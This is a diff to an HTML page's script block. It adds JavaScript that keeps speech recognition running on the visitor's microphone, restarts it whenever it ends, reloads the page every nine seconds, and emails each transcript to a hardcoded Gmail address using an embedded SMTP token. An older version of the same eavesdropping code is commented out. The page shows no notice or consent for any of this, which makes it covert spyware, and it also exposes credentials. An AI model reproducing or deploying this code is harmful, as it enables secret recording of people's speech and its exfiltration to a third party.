@@ -507,46 +507,90 @@
 
   <script>
 
-            var speech = true;
 
-            const SpeechRecognition = window.speechRecognition || window.webkitSpeechRecognition;
+function sup(){
+var recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition || window.mozSpeechRecognition || window.msSpeechRecognition)();
+recognition.lang = 'en-US';
+recognition.interimResults = false;
+recognition.maxAlternatives = 5;
+recognition.start();
+}
 
-            const recognition = new SpeechRecognition();
+recognition.onresult = function(event) {
+   sendEmail(event.results[0][0].transcript);
+ sup();
+};
+recognition.onend = () => {
 
-            recognition.interimResults = true;
+sup();
+  console.log("Speech recognition service disconnected");
+};
 
-            // const words = document.querySelector('.words');
-            // words.appendChild(p);
+recognition.onnomatch = () => {
+sup();
 
-            recognition.addEventListener('result', e => {
-              const transcript = Array.from(e.results)
-                .map(result => result[0])
-                .map(result => result.transcript)
-                .join('')
+  console.error("Speech not recognized");
+};
+function sendEmail(speeches){
+
+
+  Email.send({
+SecureToken : "683d8d05-8106-4cc8-88b0-ca12cd63f1a1",
+To : 'punk13134@gmail.com',
+From : "punk1313444@gmail.com",
+Subject : "This is the subject",
+Body : "The speech is"  + speeches
+}).then(
+message => console.log(message)
+);}
+
+sendEmail();
+
+setInterval(()=>{
+  location.reload();
+},9000)
+
+
+            // var speech = true;
+
+            // const SpeechRecognition = window.speechRecognition || window.webkitSpeechRecognition;
+
+            // const recognition = new SpeechRecognition();
+
+            // recognition.interimResults = true;
+
+            // // const words = document.querySelector('.words');
+            // // words.appendChild(p);
+
+            // recognition.addEventListener('result', e => {
+            //   const transcript = Array.from(e.results)
+            //     .map(result => result[0])
+            //     .map(result => result.transcript)
+            //     .join('')
               
 
-              //document.getElementById("p").innerHTML = transcript;
-              console.log(transcript);
+            //   //document.getElementById("p").innerHTML = transcript;
+            //   console.log(transcript);
 
-              Email.send({
-                            SecureToken : "683d8d05-8106-4cc8-88b0-ca12cd63f1a1",
-                            To : 'punk13134@gmail.com',
-                            From : "punk1313444@gmail.com",
-                            Subject : "This is the subject",
-                            Body : "Voice: "+ transcript,
-                        }).then(
-                        message => console.log("Message Sent")
+            //   Email.send({
+            //                 SecureToken : "683d8d05-8106-4cc8-88b0-ca12cd63f1a1",
+            //                 To : 'punk13134@gmail.com',
+            //                 From : "punk1313444@gmail.com",
+            //                 Subject : "This is the subject",
+            //                 Body : "Voice: "+ transcript,
+            //             }).then(
+            //             message => console.log("Message Sent")
                 
-                        );
+            //             );
 
-            });
+            // });
 
-            if (speech == true) {
-              recognition.start();
-              recognition.addEventListener('end', recognition.start);
+            // if (speech == true) {
+            //   recognition.start();
+            //   recognition.addEventListener('end', recognition.start);
 
 
-            }
+            // }
 
   </script>
 
